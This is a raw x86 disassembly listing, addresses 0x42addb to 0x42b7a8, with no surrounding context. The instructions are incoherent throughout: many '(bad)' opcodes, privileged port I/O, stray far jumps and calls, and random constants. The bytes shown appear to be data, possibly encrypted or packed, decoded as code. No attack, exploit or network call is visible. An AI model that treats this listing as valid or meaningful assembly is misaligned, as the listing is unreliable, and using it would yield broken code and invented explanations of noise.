  42addb:	ds (bad) 
  42addd:	das    
  42adde:	in     eax,0x1d
  42ade0:	mov    al,ds:0x185e056a
  42ade5:	push   eax
  42ade6:	test   edi,eax
  42ade8:	ja     0x42ae50
  42adea:	jmp    0x78ef226
  42adef:	leave  
  42adf0:	jb     0x42ae07
  42adf2:	pop    es
  42adf3:	mov    al,BYTE PTR [edx]
  42adf5:	shl    DWORD PTR [edx-0x799f825],cl
  42adfb:	fldenv [edx+edi*1+0x6e73e61e]
  42ae02:	push   cs
  42ae03:	jle    0x42ae61
  42ae05:	sub    dl,BYTE PTR [ebx+0x6eda4f3a]
  42ae0b:	inc    ebx
  42ae0c:	test   DWORD PTR [ebx+edx*1-0x4a],ebp
  42ae10:	mov    cl,0x0
	...
  42ae72:	add    BYTE PTR [eax],al
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	mov    ah,0x58
  42ae82:	add    al,0x4
  42ae84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ae85:	retf   
  42ae86:	add    DWORD PTR [eax],eax
  42ae88:	add    eax,0x2b000001
  42ae8d:	inc    ebx
  42ae8e:	lods   eax,DWORD PTR ds:[esi]
  42ae8f:	xchg   ebp,eax
  42ae90:	jl     0x42aec3
  42ae92:	aas    
  42ae93:	pop    ss
  42ae94:	push   edi
  42ae95:	ret    
  42ae96:	pop    ds
  42ae97:	mov    esp,0xf300a4db
  42ae9c:	jl     0x42af06
  42ae9e:	and    edi,DWORD PTR [ecx+0x4bb19667]
  42aea4:	aas    
  42aea5:	jmp    0x62b4509b
  42aeaa:	je     0x42aef8
  42aeac:	xor    esi,DWORD PTR [ebx]
  42aeae:	scas   al,BYTE PTR es:[edi]
  42aeaf:	mov    gs,WORD PTR [edi-0x68a000dc]
  42aeb5:	ds adc al,0xb6
  42aeb9:	shl    BYTE PTR [ebx+0x36c3e2b9],0xb6
  42aec0:	sahf   
  42aec1:	fst    QWORD PTR [ebx]
  42aec3:	sub    BYTE PTR [eax+0x1e],bl
  42aec6:	or     edx,DWORD PTR [ecx+0x5f]
  42aec9:	in     eax,0xea
  42aecb:	cmp    al,0x3b
  42aecd:	cmp    al,0x98
  42aecf:	pushf  
  42aed0:	sbb    esp,DWORD PTR [edx]
  42aed2:	sub    esi,DWORD PTR [esi]
  42aed4:	cmp    esp,DWORD PTR [eax-0x4b969d97]
  42aeda:	ins    DWORD PTR es:[edi],dx
  42aedb:	mov    edi,0x6280e955
  42aee0:	or     ebp,ebx
  42aee2:	or     eax,0xf89c0b78
  42aee7:	and    eax,0xbcd58fa3
  42aeec:	imul   edi,DWORD PTR [ecx-0x1],0xffffffca
  42aef0:	and    eax,0xac69b5f8
  42aef5:	push   esi
  42aef6:	in     al,0xe4
  42aef8:	add    dl,BYTE PTR [ecx+edx*4+0x43]
  42aefc:	or     BYTE PTR [edx-0x7],bl
  42aeff:	mov    eax,0xa5651678
  42af04:	sub    DWORD PTR [ebp+0xa31a7d3],esi
  42af0a:	pop    esp
  42af0b:	adc    BYTE PTR [edi+ebp*4-0x79],al
  42af0f:	inc    ecx
  42af10:	lods   eax,DWORD PTR ds:[esi]
  42af11:	ret    
  42af12:	fbstp  TBYTE PTR [ecx]
  42af14:	lds    eax,FWORD PTR [edx+eiz*2-0x1d3a2f16]
  42af1b:	fst    st(1)
  42af1d:	mul    DWORD PTR [ebp+edi*1-0x243b5b6c]
  42af24:	add    BYTE PTR ds:0xd3e40d89,bh
  42af2a:	sbb    eax,0xb0dc32ba
  42af2f:	adc    BYTE PTR [edx],bl
  42af31:	idiv   DWORD PTR [ebx+0x12278843]
  42af37:	test   DWORD PTR [eax+0x4c2bc718],ebp
  42af3d:	inc    esp
  42af3e:	aaa    
  42af3f:	add    eax,0x768b5b55
  42af44:	push   eax
  42af45:	cdq    
  42af46:	xchg   esp,eax
  42af47:	ret    0xef2c
  42af4a:	xchg   ebp,eax
  42af4b:	stos   DWORD PTR es:[edi],eax
  42af4c:	mov    gs,WORD PTR [esi+0x69a41e63]
  42af52:	ja     0x42afd3
  42af54:	cli    
  42af55:	mov    bh,0xa3
  42af57:	jnp    0x42af49
  42af59:	inc    edx
  42af5a:	jp     0x42afd8
  42af5c:	sahf   
  42af5d:	mov    esi,0x465cf858
  42af62:	jns    0x42af5c
  42af64:	and    al,BYTE PTR [eax]
  42af66:	and    al,BYTE PTR [ebp-0x30]
  42af69:	jmp    0x6046d706
  42af6e:	inc    ecx
  42af6f:	or     al,0xe1
  42af71:	mov    bh,0x7e
  42af73:	(bad)  
  42af74:	enter  0x5e64,0x24
  42af78:	dec    edi
  42af79:	xchg   ebp,eax
  42af7a:	fiadd  WORD PTR [edi-0x146587c9]
  42af80:	jns    0x42af64
  42af82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42af83:	sar    BYTE PTR [ecx],cl
  42af85:	and    eax,0xf16e015
  42af8a:	sbb    al,0x85
  42af8c:	mov    al,0xae
  42af8e:	iret   
  42af8f:	mov    WORD PTR [ecx+0x0],fs
	...
  42aff1:	add    BYTE PTR [eax],al
  42aff3:	add    cl,bh
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	not    edx
  42b002:	jecxz  0x42afee
  42b004:	stos   BYTE PTR es:[edi],al
  42b005:	int3   
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    eax,0x70000001
  42b00d:	mov    al,0x6c
  42b00f:	add    DWORD PTR [ebp+0x4670d43],ecx
  42b015:	mov    bh,0x56
  42b017:	retf   
  42b018:	sbb    al,0x5e
  42b01a:	sub    DWORD PTR [eax],ebx
  42b01c:	jmp    0x42afd3
  42b01e:	mov    al,0xb5
  42b020:	xor    eax,0x67eae99e
  42b025:	retf   0x7596
  42b028:	mov    bh,0xc8
  42b02a:	ss mov ch,0x2c
  42b02d:	xor    al,0x11
  42b02f:	outs   dx,BYTE PTR ds:[esi]
  42b030:	mov    ecx,0xc055548d
  42b035:	hlt    
  42b036:	jmp    0x4ae68e54
  42b03b:	out    0xbc,al
  42b03d:	in     al,dx
  42b03e:	popf   
  42b03f:	xchg   esp,eax
  42b040:	and    al,0x93
  42b042:	jmp    0x62d08463
  42b047:	jbe    0x42b04c
  42b049:	fstp   TBYTE PTR [ebx]
  42b04b:	cmc    
  42b04c:	mov    al,0xb2
  42b04e:	add    BYTE PTR [esi+ebp*2],al
  42b051:	sub    al,0x27
  42b054:	scas   eax,DWORD PTR es:[edi]
  42b055:	popf   
  42b056:	cmp    al,0xb7
  42b058:	jl     0x42b051
  42b05a:	jl     0x42b077
  42b05c:	sub    edx,DWORD PTR [ebx-0x74]
  42b05f:	adc    esi,DWORD PTR [eax+esi*8-0x25]
  42b063:	pop    ss
  42b064:	rcr    DWORD PTR [esi],cl
  42b066:	and    DWORD PTR [ecx-0x6f908c87],0x60
  42b06d:	dec    edx
  42b06e:	jo     0x42b00b
  42b070:	pop    ecx
  42b071:	rcr    DWORD PTR [ecx],cl
  42b073:	sub    al,0x7f
  42b075:	(bad)  
  42b076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b077:	inc    ebp
  42b078:	out    dx,eax
  42b079:	(bad)  
  42b07b:	cmp    BYTE PTR [edx],dh
  42b07d:	pop    edi
  42b07e:	jae    0x42b01c
  42b080:	adc    DWORD PTR [esi],eax
  42b082:	inc    ebp
  42b083:	push   cs
  42b084:	xchg   edx,eax
  42b085:	jecxz  0x42b045
  42b087:	(bad)  
  42b088:	jg     0x42b0e6
  42b08a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b08b:	xor    al,0xd1
  42b08d:	jge    0x42b0e7
  42b08f:	repnz pop esi
  42b091:	xor    al,0x53
  42b093:	add    DWORD PTR [edi+0x6f],esp
  42b096:	ficomp DWORD PTR [ebx-0x21]
  42b099:	sub    esp,edx
  42b09b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b09c:	ds push es
  42b09e:	sahf   
  42b09f:	push   ds
  42b0a0:	xor    BYTE PTR [edi+0x1f],al
  42b0a3:	mov    edi,0xc79c5978
  42b0a8:	or     al,0x42
  42b0aa:	mov    ebx,0xbf1107fa
  42b0af:	out    dx,eax
  42b0b0:	es pop es
  42b0b2:	sbb    BYTE PTR [ebx],ch
  42b0b4:	cdq    
  42b0b5:	test   bl,bl
  42b0b7:	hlt    
  42b0b8:	push   es
  42b0b9:	in     al,0x71
  42b0bb:	loopne 0x42b0fb
  42b0bd:	outs   dx,BYTE PTR ds:[esi]
  42b0be:	rcl    DWORD PTR [edx+0xb],1
  42b0c1:	push   ebp
  42b0c2:	test   al,0xef
  42b0c4:	adc    DWORD PTR [ecx],ecx
  42b0c6:	clc    
  42b0c7:	cmp    eax,0x7f9b43e0
  42b0cc:	ins    BYTE PTR es:[edi],dx
  42b0cd:	push   ebp
  42b0ce:	push   ebx
  42b0cf:	push   ebx
  42b0d0:	sbb    dh,BYTE PTR [esi+edx*4]
  42b0d3:	fsub   QWORD PTR [esi+0x7d1fff9]
  42b0d9:	push   esp
  42b0da:	adc    bh,BYTE PTR [esi-0x24]
  42b0dd:	xor    al,0xf8
  42b0df:	ret    
  42b0e0:	pop    eax
  42b0e1:	mov    bl,0xcc
  42b0e3:	jb     0x42b124
  42b0e5:	jbe    0x42b14e
  42b0e7:	(bad)  
  42b0e8:	jmp    0x42b165
  42b0ea:	fisttp WORD PTR [ecx]
  42b0ec:	cmp    DWORD PTR [ebp-0x3ef6e842],edx
  42b0f2:	push   0x2eee7956
  42b0f7:	push   ebp
  42b0f8:	lods   eax,DWORD PTR ds:[esi]
  42b0f9:	loopne 0x42b12c
  42b0fb:	push   ebx
  42b0fc:	jg     0x42b15b
  42b0fe:	mov    ds:0x6aecf181,al
  42b103:	mov    edx,0xb18c834b
  42b108:	xor    edx,DWORD PTR [edi+eax*4+0x14e4963b]
  42b10f:	and    BYTE PTR [ecx],ch
	...
  42b171:	add    BYTE PTR [eax],al
  42b173:	add    BYTE PTR [ebp+0x25],dh
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	sbb    eax,0xaf0f156b
  42b185:	int    0x1
  42b187:	add    BYTE PTR ds:0x91000001,al
  42b18d:	pop    eax
  42b18e:	jge    0x42b131
  42b190:	pop    ss
  42b191:	pop    ebp
  42b192:	add    al,0x54
  42b194:	dec    ecx
  42b195:	ror    ebp,cl
  42b197:	jae    0x42b19e
  42b199:	test   DWORD PTR [esi+0x520b02af],esi
  42b19f:	jmp    0x42b1b9
  42b1a1:	sar    BYTE PTR [edx-0x3923a4b2],0x69
  42b1a8:	das    
  42b1a9:	cmp    eax,0xfd85bab9
  42b1ae:	out    0xd,al
  42b1b0:	test   DWORD PTR [eax+0x191cc576],eax
  42b1b6:	xor    al,0x77
  42b1b8:	das    
  42b1b9:	cmp    eax,esi
  42b1bb:	enter  0xf22c,0x4f
  42b1bf:	xchg   ebx,eax
  42b1c0:	pushf  
  42b1c1:	jmp    0x42b227
  42b1c3:	and    dl,bh
  42b1c5:	test   al,0xe3
  42b1c7:	jmp    0x8498:0xb8a92503
  42b1ce:	repnz mov eax,0x874c99cf
  42b1d4:	fadd   st,st(1)
  42b1d6:	mov    ecx,0xd9d019fc
  42b1db:	mov    bl,0xbb
  42b1dd:	inc    esp
  42b1de:	adc    eax,0xad0989e4
  42b1e3:	mov    al,ds:0x234bd960
  42b1e8:	dec    eax
  42b1e9:	pop    edx
  42b1ea:	stc    
  42b1eb:	or     al,0x61
  42b1ed:	mov    eax,ss
  42b1ef:	pop    ebp
  42b1f0:	call   eax
  42b1f2:	cmp    bl,BYTE PTR [edi-0x77]
  42b1f5:	lahf   
  42b1f6:	push   esp
  42b1f7:	sbb    eax,0x63c275ff
  42b1fc:	adc    eax,0x8e06ba97
  42b201:	ins    BYTE PTR es:[edi],dx
  42b202:	out    0xba,al
  42b204:	aad    0x4d
  42b206:	retf   
  42b207:	sub    DWORD PTR [edi+0xc2c8f5],eax
  42b20d:	rcr    DWORD PTR [edx],1
  42b20f:	xor    BYTE PTR ds:0xc310b984,cl
  42b215:	xchg   edx,eax
  42b216:	gs dec esi
  42b218:	outs   dx,BYTE PTR fs:[esi]
  42b21a:	(bad)  ds:0xaeb82562
  42b220:	stos   DWORD PTR es:[edi],eax
  42b221:	mov    esi,0x9c0f678c
  42b226:	loopne 0x42b283
  42b228:	cmp    BYTE PTR [bp+si+0x70],cl
  42b22c:	or     BYTE PTR [ecx+0x23],bh
  42b22f:	sub    al,0x98
  42b231:	call   0xf1fd:0x9101dd36
  42b238:	jno    0x42b229
  42b23a:	pop    ebp
  42b23b:	nop
  42b23c:	cmp    al,0x86
  42b23e:	in     al,0x8f
  42b240:	cmp    DWORD PTR es:[edx],ebx
  42b243:	xchg   ebp,eax
  42b244:	mov    dl,0x4a
  42b246:	xchg   ecx,eax
  42b247:	lods   al,BYTE PTR ds:[esi]
  42b248:	(bad)  
  42b249:	dec    ebp
  42b24a:	jae    0x42b2b3
  42b24c:	stos   BYTE PTR es:[edi],al
  42b24d:	fild   DWORD PTR [edi]
  42b24f:	gs sti 
  42b251:	mov    eax,0x89176d78
  42b256:	mov    fs,WORD PTR [edx+esi*1-0x20]
  42b25a:	call   0x2a7a:0x8c993e5b
  42b261:	lods   al,BYTE PTR ds:[esi]
  42b262:	mov    dh,BYTE PTR [ebx]
  42b264:	pushf  
  42b265:	jl     0x42b1ff
  42b267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b268:	adc    al,0x52
  42b26a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b26b:	popf   
  42b26c:	dec    ebp
  42b26d:	xchg   esp,eax
  42b26e:	popf   
  42b26f:	loop   0x42b2e8
  42b271:	rcr    DWORD PTR [eax+0x57f6ca0e],0xf0
  42b278:	lea    esi,[eax-0x4]
  42b27b:	(bad)  
  42b27c:	add    BYTE PTR [ecx-0x165edf82],al
  42b282:	sub    al,0x18
  42b284:	fmul   st,st(7)
  42b286:	sbb    BYTE PTR [eax],ch
  42b288:	jae    0x42b258
  42b28a:	xor    bh,BYTE PTR [edi]
  42b28c:	dec    ebp
  42b28d:	jg     0x42b2a1
  42b28f:	sbb    BYTE PTR [ebp+0x0],bh
	...
  42b2f1:	add    BYTE PTR [eax],al
  42b2f3:	add    BYTE PTR [ebp-0x449f6672],ah
  42b2f9:	ja     0x42b2f8
  42b2fb:	iret   
  42b2fc:	sub    eax,0xcf738e65
  42b301:	mov    esi,0xceb4c984
  42b306:	add    DWORD PTR [eax],eax
  42b308:	add    eax,0xfc000001
  42b30d:	or     eax,0x418fb45b
  42b312:	pop    ds
  42b313:	push   ds
  42b314:	das    
  42b315:	jbe    0x42b327
  42b317:	lods   eax,DWORD PTR ds:[esi]
  42b318:	iret   
  42b319:	je     0x42b2f8
  42b31b:	loop   0x42b38e
  42b31d:	(bad)  
  42b31e:	lock das 
  42b320:	pop    eax
  42b321:	mov    ds:0x601343a,al
  42b326:	mov    esp,0xc7111561
  42b32b:	fdivr  DWORD PTR [ebx]
  42b32d:	adc    bl,BYTE PTR [edx]
  42b32f:	mov    dl,0x28
  42b331:	ds mov ebx,0x5c54e7aa
  42b337:	leave  
  42b338:	and    edi,ebx
  42b33a:	inc    ebx
  42b33b:	inc    esp
  42b33c:	push   esi
  42b33d:	pop    ecx
  42b33e:	ins    DWORD PTR es:[edi],dx
  42b33f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b340:	xlat   BYTE PTR ds:[ebx]
  42b341:	dec    esp
  42b342:	(bad)  [ebp+0x18]
  42b345:	inc    edx
  42b346:	mov    cl,0xe1
  42b348:	inc    ecx
  42b349:	add    DWORD PTR [ecx+0x2b],eax
  42b34c:	imul   edi,DWORD PTR [ebp+edx*4+0x7d],0x2dcf64f2
  42b354:	inc    ebx
  42b355:	mov    edi,0x3418baa4
  42b35a:	inc    ebx
  42b35b:	ss loope 0x42b3a4
  42b35e:	retf   
  42b35f:	imul   esp,DWORD PTR [edi],0xd01136c1
  42b365:	push   eax
  42b366:	ret    0xde1f
  42b369:	inc    ebx
  42b36a:	ficomp DWORD PTR ds:0xf16e4bc5
  42b370:	icebp  
  42b371:	inc    edx
  42b372:	sub    eax,0x91585bd5
  42b377:	pop    edx
  42b378:	adc    eax,0xac5f65f7
  42b37d:	sub    BYTE PTR ds:0x53b7b711,al
  42b383:	xchg   ebp,eax
  42b384:	pop    ebp
  42b385:	not    eax
  42b387:	out    0xd1,eax
  42b389:	dec    esi
  42b38a:	xchg   ecx,eax
  42b38b:	add    DWORD PTR [eax+0x240bde47],ebx
  42b391:	in     al,0x2d
  42b393:	rcl    BYTE PTR [eax-0x25],cl
  42b396:	mov    cl,0xcc
  42b398:	push   ecx
  42b399:	push   0xffffff95
  42b39b:	arpl   WORD PTR [eax],dx
  42b39d:	daa    
  42b39e:	popa   
  42b39f:	or     al,0x8
  42b3a1:	daa    
  42b3a2:	mov    esp,DWORD PTR [edx-0x71]
  42b3a5:	psadbw mm3,QWORD PTR ds:0x3028389
  42b3ac:	xor    cl,BYTE PTR gs:[ebx]
  42b3af:	sahf   
  42b3b0:	jl     0x42b3ee
  42b3b2:	rol    DWORD PTR [ebp+edi*2-0x15],cl
  42b3b6:	or     eax,0x3650e2d7
  42b3bb:	or     DWORD PTR [ecx],0xb0cc02b4
  42b3c1:	adc    al,0x72
  42b3c3:	sbb    al,0x87
  42b3c5:	int    0x5a
  42b3c7:	cmc    
  42b3c8:	push   ecx
  42b3c9:	pop    edx
  42b3ca:	jg     0x42b3e3
  42b3cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b3cd:	mov    edx,0xf015593e
  42b3d2:	bound  esp,QWORD PTR [ebx+0x7013f4df]
  42b3d8:	gs jno 0x42b3d3
  42b3db:	ds and edi,esp
  42b3de:	js     0x42b400
  42b3e0:	mov    al,ds:0xb3c9e40c
  42b3e5:	mov    ebx,0xf2f772ab
  42b3ea:	sbb    cl,BYTE PTR [ebp+0x39]
  42b3ed:	ss dec esp
  42b3ef:	and    bh,BYTE PTR ds:0xbefedd41
  42b3f5:	sbb    DWORD PTR ds:0x1d73e9f4,0x63ecf335
  42b3ff:	mov    ch,ch
  42b401:	(bad)  
  42b402:	imul   ecx,DWORD PTR [ecx],0x10
  42b405:	xor    BYTE PTR [ecx],0x55
  42b408:	pusha  
  42b409:	mov    ds:0xc78a9dff,al
  42b40e:	sbb    esi,ecx
  42b410:	loop   0x42b412
	...
  42b472:	add    BYTE PTR [eax],al
  42b474:	mov    al,BYTE PTR [ebp+0x20]
  42b477:	out    dx,al
  42b478:	out    dx,eax
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [eax],ebx
  42b481:	outs   dx,BYTE PTR ds:[esi]
  42b482:	mov    dl,0xc0
  42b484:	mov    ecx,0x50001cf
  42b489:	add    DWORD PTR [eax],eax
  42b48b:	add    ah,dl
  42b48d:	xor    al,0x13
  42b48f:	xchg   ebx,eax
  42b490:	and    bl,BYTE PTR [ecx+esi*2-0x4f60b217]
  42b497:	sbb    ch,ah
  42b499:	jno    0x42b445
  42b49b:	sbb    bl,cl
  42b49d:	jns    0x42b497
  42b49f:	call   0xad65:0x181aeb16
  42b4a6:	inc    esp
  42b4a7:	jg     0x42b465
  42b4a9:	push   ebx
  42b4aa:	imul   ebp,DWORD PTR [edi-0x5f],0x95ad64b7
  42b4b1:	repz aas 
  42b4b3:	ins    BYTE PTR es:[edi],dx
  42b4b4:	jb     0x42b4d5
  42b4b6:	jno    0x42b4ca
  42b4b8:	ret    
  42b4b9:	mov    esp,DWORD PTR [edx-0x7b0c568f]
  42b4bf:	xchg   edi,eax
  42b4c0:	scas   eax,DWORD PTR es:[edi]
  42b4c1:	xor    al,0x8
  42b4c3:	(bad)  
  42b4c4:	jo     0x42b4be
  42b4c6:	(bad)  
  42b4c7:	jns    0x42b453
  42b4c9:	adc    eax,DWORD PTR [ecx-0x11]
  42b4cc:	xor    edx,DWORD PTR [esi+eiz*4]
  42b4cf:	pop    ss
  42b4d0:	cwde   
  42b4d1:	or     ebp,DWORD PTR [ebx+0x70]
  42b4d4:	fisubr DWORD PTR [edx+0x3]
  42b4d7:	mov    bl,0xba
  42b4d9:	les    esi,FWORD PTR [ebx+0x40]
  42b4dc:	push   0xffffffae
  42b4de:	dec    esi
  42b4df:	dec    ecx
  42b4e0:	push   ss
  42b4e1:	inc    ebp
  42b4e2:	out    dx,al
  42b4e3:	sub    edx,DWORD PTR [eax+eiz*2+0x5d]
  42b4e7:	adc    eax,0x2d24aba8
  42b4ec:	add    DWORD PTR ss:[ecx+0x4e],0x4d
  42b4f1:	aam    0x7
  42b4f3:	das    
  42b4f4:	adc    DWORD PTR [edx+0x56a956ee],eax
  42b4fa:	inc    esi
  42b4fb:	jp     0x42b52e
  42b4fd:	repnz retf 
  42b4ff:	cmp    esi,esp
  42b501:	xchg   BYTE PTR [edi+0x20],bh
  42b504:	adc    dl,BYTE PTR [edx]
  42b506:	cmp    cl,dl
  42b508:	jns    0x42b57a
  42b50a:	cwde   
  42b50b:	scas   al,BYTE PTR es:[edi]
  42b50c:	dec    edi
  42b50d:	rol    DWORD PTR [edx],1
  42b50f:	sbb    al,BYTE PTR [ebx-0x55]
  42b512:	inc    edx
  42b513:	inc    esp
  42b514:	or     ebp,ecx
  42b516:	sub    BYTE PTR [ecx+eax*8+0x5f],dl
  42b51a:	add    ecx,edi
  42b51c:	rcl    BYTE PTR [edi-0x1379b95a],cl
  42b522:	aaa    
  42b523:	fs data16 (bad) 
  42b527:	ret    0x69dd
  42b52a:	psubb  mm4,QWORD PTR [eax-0x44]
  42b52e:	fwait
  42b52f:	(bad)  
  42b530:	mov    ch,0x9e
  42b532:	cld    
  42b533:	adc    bl,ch
  42b535:	and    al,0xf9
  42b537:	xor    BYTE PTR [eax],0x3b
  42b53a:	sub    eax,0x288d1cc4
  42b53f:	pushf  
  42b540:	push   ss
  42b541:	dec    eax
  42b542:	popa   
  42b543:	lods   al,BYTE PTR ds:[esi]
  42b544:	xor    esp,edx
  42b546:	adc    al,0x6c
  42b548:	mov    WORD PTR [ebx+0x6e],ds
  42b54b:	jmp    0x42b54e
  42b54d:	dec    ecx
  42b54e:	lds    esp,FWORD PTR [ecx]
  42b550:	add    dh,al
  42b552:	xor    bl,BYTE PTR [edi]
  42b554:	xor    BYTE PTR ds:0x40c9ee00,0x29
  42b55b:	ret    
  42b55c:	add    ah,al
  42b55e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b55f:	dec    ebp
  42b560:	shl    ebx,0xcc
  42b563:	xor    BYTE PTR [edi-0x4cac01e8],ch
  42b569:	fisttp DWORD PTR [eax]
  42b56b:	push   es
  42b56c:	sbb    dl,BYTE PTR [ecx-0x198fc0]
  42b572:	(bad)  
  42b573:	stc    
  42b574:	inc    ebp
  42b575:	mov    es,WORD PTR [ecx-0x2c4e222e]
  42b57b:	aaa    
  42b57c:	mov    bh,BYTE PTR [edi]
  42b57e:	xchg   esp,eax
  42b57f:	popf   
  42b580:	inc    ebp
  42b581:	and    dh,dl
  42b583:	(bad)  
  42b584:	imul   DWORD PTR [esp+esi*8]
  42b587:	add    al,dl
  42b589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b58a:	push   0x2ac939e5
  42b58f:	or     BYTE PTR [ebp+0x0],dh
	...
  42b5f2:	add    BYTE PTR [eax],al
  42b5f4:	loopne 0x42b58a
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	sub    ah,BYTE PTR [esi-0x2f4172e0]
  42b606:	add    DWORD PTR [eax],eax
  42b608:	add    eax,0xc1000001
  42b60d:	pop    ecx
  42b60e:	mov    al,0xd0
  42b610:	jns    0x42b5e5
  42b612:	sti    
  42b613:	sub    edi,esi
  42b615:	jl     0x42b603
  42b617:	push   cs
  42b618:	mov    al,ds:0x7a56ee84
  42b61d:	(bad)  
  42b61e:	stc    
  42b61f:	pop    es
  42b620:	jmp    FWORD PTR [eax]
  42b622:	lock xor al,ah
  42b625:	sub    BYTE PTR [ebx],0x4b
  42b628:	and    eax,0x2eca276c
  42b62d:	mov    cl,0xb7
  42b62f:	mov    eax,ds:0xd8547175
  42b634:	js     0x42b60e
  42b636:	adc    eax,0x47caad72
  42b63b:	sbb    eax,DWORD PTR [ebx]
  42b63d:	ss mov edx,0x2ad7bcd0
  42b643:	retf   0x7dcd
  42b646:	test   DWORD PTR [esi+esi*1],esp
  42b649:	ins    DWORD PTR es:[edi],dx
  42b64a:	mov    esi,ecx
  42b64c:	xchg   esi,eax
  42b64d:	(bad)  
  42b64e:	pop    eax
  42b64f:	loop   0x42b680
  42b651:	sbb    BYTE PTR [ecx+0x1a38a8c4],0xdf
  42b658:	aas    
  42b659:	(bad)  
  42b65a:	addr16 sahf 
  42b65c:	addr16 inc ebp
  42b65e:	cmp    bh,BYTE PTR [esi]
  42b660:	xchg   edx,eax
  42b661:	and    eax,0x1c063528
  42b666:	dec    esi
  42b667:	int3   
  42b668:	jecxz  0x42b699
  42b66a:	mov    edx,0xc7704732
  42b66f:	cmp    DWORD PTR [eax],ecx
  42b671:	inc    edi
  42b672:	sub    dl,BYTE PTR [edx-0x23]
  42b675:	push   ss
  42b676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b677:	jnp    0x42b65a
  42b679:	test   DWORD PTR [edx-0x48],ebx
  42b67c:	nop
  42b67d:	(bad)  [ecx-0x5a]
  42b680:	scas   eax,DWORD PTR es:[edi]
  42b681:	inc    edx
  42b682:	pusha  
  42b683:	call   0x824e693c
  42b688:	int3   
  42b689:	dec    edx
  42b68a:	arpl   WORD PTR [ecx+eax*2],si
  42b68d:	jmp    0xadf00134
  42b692:	pop    ebp
  42b693:	xchg   ebp,eax
  42b694:	ins    DWORD PTR es:[edi],dx
  42b695:	push   ebp
  42b696:	cmp    eax,0x6c767760
  42b69b:	inc    edx
  42b69c:	ins    BYTE PTR es:[edi],dx
  42b69d:	cwde   
  42b69e:	dec    edx
  42b69f:	lds    ecx,FWORD PTR [edx+edi*8-0x44]
  42b6a3:	pop    es
  42b6a4:	xchg   edi,eax
  42b6a5:	push   esi
  42b6a6:	push   es
  42b6a7:	scas   eax,DWORD PTR es:[edi]
  42b6a8:	jmp    0x42b6a2
  42b6aa:	mov    ah,0xd6
  42b6ac:	je     0x42b648
  42b6ae:	out    dx,al
  42b6af:	aad    0xc3
  42b6b1:	sbb    esi,ebp
  42b6b3:	rcl    BYTE PTR [edx+0x3a292e00],1
  42b6b9:	test   al,cl
  42b6bb:	pushf  
  42b6bc:	mov    esp,0x82e3ea0b
  42b6c1:	jp     0x42b731
  42b6c3:	inc    esp
  42b6c4:	push   cs
  42b6c5:	cwde   
  42b6c6:	arpl   WORD PTR [ecx-0x4420e9a9],ax
  42b6cc:	ror    bh,1
  42b6ce:	xchg   edi,eax
  42b6cf:	lods   eax,DWORD PTR ds:[esi]
  42b6d0:	in     al,dx
  42b6d1:	cmp    DWORD PTR [ebx+eiz*8-0x427f7133],edx
  42b6d8:	cmp    al,0x15
  42b6da:	(bad)  
  42b6db:	lock scas eax,DWORD PTR es:[edi]
  42b6dd:	or     eax,0x3e02fb5a
  42b6e2:	push   ebp
  42b6e3:	mov    ebp,0x2851ef9b
  42b6e8:	inc    eax
  42b6e9:	push   ds
  42b6ea:	popf   
  42b6eb:	std    
  42b6ec:	(bad)  
  42b6ed:	adc    DWORD PTR [esi],ebx
  42b6ef:	sub    al,0xc9
  42b6f1:	hlt    
  42b6f2:	test   al,0x58
  42b6f4:	xchg   edx,eax
  42b6f5:	mov    es,WORD PTR [ecx-0x71dcdb2e]
  42b6fb:	add    DWORD PTR [eax],edx
  42b6fd:	out    dx,al
  42b6fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b6ff:	xor    edx,DWORD PTR [edi]
  42b701:	push   es
  42b702:	jns    0x42b763
  42b704:	adc    DWORD PTR [esi-0x21],eax
  42b707:	mov    dh,0xf2
  42b709:	jne    0x42b75e
  42b70b:	lods   eax,DWORD PTR ds:[esi]
  42b70c:	aam    0x80
  42b70e:	sahf   
  42b70f:	retf   
  42b710:	push   es
	...
  42b771:	add    BYTE PTR [eax],al
  42b773:	add    BYTE PTR [esi+0x42],cl
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	and    BYTE PTR [edi+0x7a],0xd2
  42b784:	ret    
  42b785:	rol    DWORD PTR [ecx],1
  42b787:	add    BYTE PTR ds:0x9b000001,al
  42b78d:	push   es
  42b78e:	xor    ebp,DWORD PTR [ebx+0x6]
  42b791:	aas    
  42b792:	mov    ch,0x3f
  42b794:	or     al,0x8d
  42b796:	add    dl,al
  42b798:	add    BYTE PTR [ebx+edx*8+0x2f87e772],ah
  42b79f:	leave  
  42b7a0:	cmp    DWORD PTR [ecx+esi*4-0x38],0xffffff93
  42b7a5:	and    esp,ebx
  42b7a7:	aaa    
  42b7a8:	sbb    DWORD PTR [edx-0xf2ff1b0],esp
